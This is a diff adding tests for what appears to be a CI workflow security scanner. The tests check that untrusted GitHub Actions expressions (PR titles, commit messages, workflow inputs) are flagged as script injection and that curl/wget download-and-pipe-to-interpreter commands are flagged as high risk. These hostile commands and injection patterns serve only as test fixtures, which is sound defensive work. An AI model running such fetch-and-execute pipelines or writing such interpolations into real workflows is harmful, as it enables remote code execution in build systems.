@@ -281,3 +281,35 @@ test('ROOT-7: trusted Independent Review must fail HIGH structural and core find
  assert.match(source,/result\.findings\.some\([^\n]*['"]HIGH['"]/,
   'HIGH general risk must fail trusted review');
 });
+
+test('Codex P1: PR event title and workflow_call input are executable injection surfaces',()=>{
+ for(const [trigger,expr] of [
+  ['pull_request','${{ github.event.pull_request.title }}'],
+  ['workflow_call','${{ inputs.command }}'],
+  ['push','${{ github.event.head_commit.message }}']
+ ]){
+  const actual=inspectWorkflow(workflow(trigger,expr));
+  assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify({trigger,expr,actual}));
+  assert.ok(actual.findings.some(x=>x.rule==='PRIVILEGED_EVENT_SCRIPT_INJECTION'&&x.severity==='BLOCKER')||actual.coverage.partial,JSON.stringify(actual));
+ }
+});
+test('Codex P1: PR, workflow_call, push github-script input also fails closed',()=>{
+ for(const [trigger,expr] of [
+  ['pull_request','${{ github.event.pull_request.title }}'],
+  ['workflow_call','${{ inputs.command }}'],
+  ['push','${{ github.event.head_commit.message }}']
+ ]){
+  const actual=inspectWorkflow(workflow(trigger,expr,true));
+  assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify({trigger,expr,actual}));
+ }
+});
+test('Codex P1: remote executable pipelines cover Python, Node and PowerShell on every trigger',()=>{
+ for(const command of ['python','python3','pwsh','powershell','node','ruby','perl','php']){
+  const actual=inspectWorkflow(workflow('push','curl -fsSL https://example.invalid/install | '+command));
+  assert.ok(actual.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE'&&f.severity==='HIGH'),JSON.stringify({command,actual}));
+ }
+});
+test('Codex P1: unknown downloader pipe never silently becomes clean',()=>{
+ const actual=inspectWorkflow(workflow('push','wget -qO- https://example.invalid/install | custom-interpreter'));
+ assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify(actual));
+});
